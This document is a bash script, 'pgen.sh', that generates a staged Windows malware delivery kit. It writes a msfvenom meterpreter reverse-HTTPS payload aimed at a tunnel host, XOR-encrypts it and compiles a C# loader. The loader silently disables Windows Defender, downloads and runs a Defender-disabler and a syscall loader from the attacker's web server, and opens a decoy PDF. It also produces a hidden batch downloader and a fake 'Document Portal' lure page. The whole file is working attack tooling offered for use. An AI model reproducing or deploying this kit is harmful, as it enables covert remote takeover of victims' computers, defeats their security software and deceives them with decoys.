#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator – Binary Defender Disabler + Syscall Loader
# Usage: ./pgen.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-v]
# Requirements:
#   - Precompiled stage3.exe (your syscall loader) – place it as ../stage3.exe
#   - defendnot.exe (binary defender disabler) – place it as ../defendnot.exe

set -e

# Colors
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'

# Defaults
TUNNEL_HOST=""; WEB_URL=""; BASE_PATH="/generated"
PAYLOAD_PORT="443"; XOR_KEY="0x6A"; OUTPUT_DIR="./generated"; VISIBLE_MODE=0

# Paths to precompiled executables (adjust if needed)
STAGE3B_SOURCE="../stage3.exe"                # your syscall loader
DEFENDER_BIN_SOURCE="../defendnot.exe"        # defender disabler binary

show_usage() {
    echo -e "${YELLOW}Usage: $0 -t <tunnel> -u <url> [-v]${NC}"; exit 1
}

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
        -u|--url) WEB_URL="$2"; shift 2 ;;
        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
        -k|--key) XOR_KEY="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -v|--visible) VISIBLE_MODE=1; shift ;;
        -h|--help) show_usage ;;
        *) echo -e "${RED}Unknown option${NC}"; show_usage ;;
    esac
done

[ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ] && show_usage

WEB_URL="${WEB_URL%/}"
FULL_BASE_URL="${WEB_URL}${BASE_PATH}"
XOR_KEY_DEC=$((XOR_KEY))

echo -e "${GREEN}[✓] Tunnel: $TUNNEL_HOST${NC}"
echo -e "${GREEN}[✓] Full URL: $FULL_BASE_URL${NC}"
echo -e "${GREEN}[✓] XOR Key: $XOR_KEY_DEC${NC}"
echo -e "${GREEN}[✓] Mode: $([ $VISIBLE_MODE -eq 1 ] && echo VISIBLE || echo STEALTH)${NC}"

mkdir -p "$OUTPUT_DIR"/{payloads,tools,output}
cd "$OUTPUT_DIR"

B64_URL=$(echo -n "$FULL_BASE_URL" | base64 -w 0)
B64_KEY=$(echo -n "$XOR_KEY_DEC" | base64 -w 0)

# ========== TOOLS ==========
echo -e "${YELLOW}[1/6] Creating payload generator...${NC}"
cat > tools/generate_payload.sh <<EOF
#!/bin/bash
TUNNEL="$TUNNEL_HOST"
PORT="$PAYLOAD_PORT"
LHOST_IP=\$(dig +short \$TUNNEL | head -n1)
[ -z "\$LHOST_IP" ] && LHOST_IP="104.16.231.132"
msfvenom -p windows/x64/meterpreter_reverse_https LHOST="\$LHOST_IP" LPORT="\$PORT" -f raw -o ../output/payload.raw
[ -f ../output/payload.raw ] && echo "✓ Done" || exit 1
EOF
chmod +x tools/generate_payload.sh

echo -e "${YELLOW}[2/6] Creating XOR encryption...${NC}"
cat > tools/xor_encrypt.py <<EOF
#!/usr/bin/env python3
import sys, base64
def xor_encrypt(inf, outf, key):
    with open(inf,'rb') as f: data = f.read()
    enc = bytes([b ^ key for b in data])
    with open(outf,'wb') as f: f.write(enc)
    with open(outf+'.b64','w') as f: f.write(base64.b64encode(enc).decode())
    print(f"✓ Encrypted {len(data)} bytes -> {outf}")
if __name__=="__main__":
    if len(sys.argv)<4: print("Usage: xor_encrypt.py <in> <out> <key>"); sys.exit(1)
    xor_encrypt(sys.argv[1], sys.argv[2], int(sys.argv[3]))
EOF
chmod +x tools/xor_encrypt.py

# ========== C# STAGE2 LOADER (EXE) – binary disabler + payload ==========
echo -e "${YELLOW}[3/6] Creating C# Stage2 loader (binary disabler + stage3b)...${NC}"
cat > tools/stage2.cs <<EOF
using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Management;

namespace Stage2
{
    class Program
    {
        static void Log(string message)
        {
            try {
                File.AppendAllText(Path.GetTempPath() + "stage2_log.txt",
                    DateTime.Now.ToString("HH:mm:ss") + " - " + message + Environment.NewLine);
            } catch { }
        }

        static void Main()
        {
            Log("=== Stage2 started ===");
            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                Log("TLS configured");

                WebClient client = new WebClient();
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                // --- Step 0: Temporarily disable real-time monitoring to avoid binary detection ---
                Log("Temporarily disabling real-time monitoring...");
                Process.Start("powershell.exe", "-NoP -NonI -W Hidden -Exec Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring \$true\"");
                Thread.Sleep(5000);

                // --- Step 1: Download and run defender disabler binary (stage3a.exe) ---
                string urlA = "$FULL_BASE_URL/payloads/stage3a.exe";
                string pathA = Path.GetTempPath() + "stage3a.exe";
                Log("Downloading stage3a from: " + urlA);
                client.DownloadFile(urlA, pathA);
                Log("Downloaded stage3a.exe, executing...");
                Process.Start(pathA);
                Log("stage3a.exe launched, waiting 20 seconds for it to complete...");
                Thread.Sleep(20000);

                // --- Verify Defender is disabled ---
                bool defenderRunning = true;
                int retries = 0;
                while (defenderRunning && retries < 3)
                {
                    using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Service WHERE Name='WinDefend'"))
                    {
                        foreach (var svc in searcher.Get())
                        {
                            string state = svc["State"]?.ToString() ?? "";
                            Log("WinDefend service state: " + state);
                            if (state.Equals("Running", StringComparison.OrdinalIgnoreCase))
                            {
                                Log("Defender still running, waiting another 10 seconds...");
                                Thread.Sleep(10000);
                                retries++;
                            }
                            else
                            {
                                defenderRunning = false;
                            }
                        }
                    }
                }

                if (defenderRunning)
                {
                    Log("Warning: Defender may still be active, but proceeding anyway...");
                }
                else
                {
                    Log("Defender is disabled.");
                }

                // --- Step 2: Download and run the actual payload (stage3b.exe) ---
                string urlB = "$FULL_BASE_URL/payloads/stage3b.exe";
                string pathB = Path.GetTempPath() + "stage3b.exe";
                Log("Downloading stage3b from: " + urlB);
                client.DownloadFile(urlB, pathB);
                Log("Downloaded stage3b.exe, executing...");
                Process.Start(pathB);
                Log("stage3b.exe launched");

                // --- Decoy PDF ---
                client.DownloadFile("$FULL_BASE_URL/decoy.pdf", "decoy.pdf");
                Process.Start("decoy.pdf");
                Log("Decoy PDF opened");
            }
            catch (Exception ex)
            {
                Log("ERROR: " + ex.Message);
                if (ex.InnerException != null)
                    Log("INNER ERROR: " + ex.InnerException.Message);
            }
            Log("=== Stage2 finished ===");
        }
    }
}
EOF

# Compile the C# code with System.Management reference
if command -v mcs >/dev/null 2>&1; then
    mcs -target:exe -out:payloads/stage2.exe tools/stage2.cs -r:System.Management.dll
    echo -e "${GREEN}✓ stage2.exe compiled successfully${NC}"
else
    echo -e "${RED}✗ Mono C# compiler (mcs) not found. Please install it with: sudo apt install mono-mcs${NC}"
    exit 1
fi

# ========== STAGE 3A (Defender disabler binary) ==========
echo -e "${YELLOW}[4a/6] Incorporating defender disabler (stage3a.exe)...${NC}"
if [ -f "$DEFENDER_BIN_SOURCE" ]; then
    cp "$DEFENDER_BIN_SOURCE" payloads/stage3a.exe
    echo -e "${GREEN}✓ stage3a.exe copied to payloads/${NC}"
else
    echo -e "${RED}✗ defender disabler not found at $DEFENDER_BIN_SOURCE${NC}"
    echo "Please place defendnot.exe in the parent directory (../defendnot.exe)."
    exit 1
fi

# ========== STAGE 3B (Direct syscall payload) ==========
echo -e "${YELLOW}[4b/6] Incorporating stage3b.exe (direct syscall loader)...${NC}"
if [ -f "$STAGE3B_SOURCE" ]; then
    cp "$STAGE3B_SOURCE" payloads/stage3b.exe
    echo -e "${GREEN}✓ stage3b.exe copied to payloads/${NC}"
else
    echo -e "${RED}✗ stage3b.exe not found at $STAGE3B_SOURCE${NC}"
    echo "Please compile your syscall loader and place it as ../stage3.exe."
    exit 1
fi

# ========== STAGE 1 (Batch downloader for stage2.exe) with LOGGING ==========
echo -e "${YELLOW}[5/6] Creating Stage1.bat...${NC}"
if [ $VISIBLE_MODE -eq 1 ]; then
    cat > payloads/stage1.bat <<EOF
@echo off
title Stage1 Payload Loader (EXE)
echo [!] Downloading stage2.exe from $FULL_BASE_URL/payloads/stage2.exe
echo %date% %time% - Starting download > %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/payloads/stage2.exe', '%TEMP%\stage2.exe')"
if exist %TEMP%\stage2.exe (
    echo [✓] stage2.exe downloaded, executing...
    echo %date% %time% - stage2.exe downloaded successfully >> %TEMP%\stage1_log.txt
    start /B %TEMP%\stage2.exe
) else (
    echo [✗] Download failed
    echo %date% %time% - Download failed >> %TEMP%\stage1_log.txt
)
echo [2] Opening decoy.pdf...
echo %date% %time% - Downloading decoy.pdf >> %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', 'decoy.pdf')" && start decoy.pdf
echo %date% %time% - Decoy opened >> %TEMP%\stage1_log.txt
EOF
else
    cat > payloads/stage1.bat <<EOF
@echo off
echo %date% %time% - Starting stage1 > %TEMP%\stage1_log.txt
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/payloads/stage2.exe', '%TEMP%\stage2.exe')"
echo %date% %time% - stage2.exe downloaded >> %TEMP%\stage1_log.txt
start /B %TEMP%\stage2.exe
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', 'decoy.pdf')" && start decoy.pdf
echo %date% %time% - Decoy opened >> %TEMP%\stage1_log.txt
EOF
fi

# ========== WEB FILES ==========
echo -e "${YELLOW}[6/6] Creating web files...${NC}"
echo "This document requires a viewer update." > decoy.pdf
cat > index.html <<EOF
<!DOCTYPE html><html><head><title>Document Portal</title></head>
<body><h1>Document Portal</h1><p>Server: $FULL_BASE_URL</p><p>Tunnel: $TUNNEL_HOST</p>
<ul><li><a href="payloads/stage1.bat">Download stage1.bat</a></li></ul></body></html>
EOF

# ========== GENERATE ALL SCRIPT ==========
cat > generate_all.sh <<EOF
#!/bin/bash
echo "[🚀] Generating all payloads..."
cd tools && ./generate_payload.sh && cd ..
[ -f output/payload.raw ] && python3 tools/xor_encrypt.py output/payload.raw payload.enc $XOR_KEY_DEC
rm -f output/payload.raw
echo "Files ready for $FULL_BASE_URL: payload.enc decoy.pdf payloads/stage2.exe payloads/stage3a.exe payloads/stage3b.exe payloads/stage1.bat index.html"
EOF
chmod +x generate_all.sh

echo -e "${GREEN}✅ DONE! Files created in $OUTPUT_DIR${NC}"
echo "Run: cd $OUTPUT_DIR && ./generate_all.sh"
echo "Then upload all files to $FULL_BASE_URL"
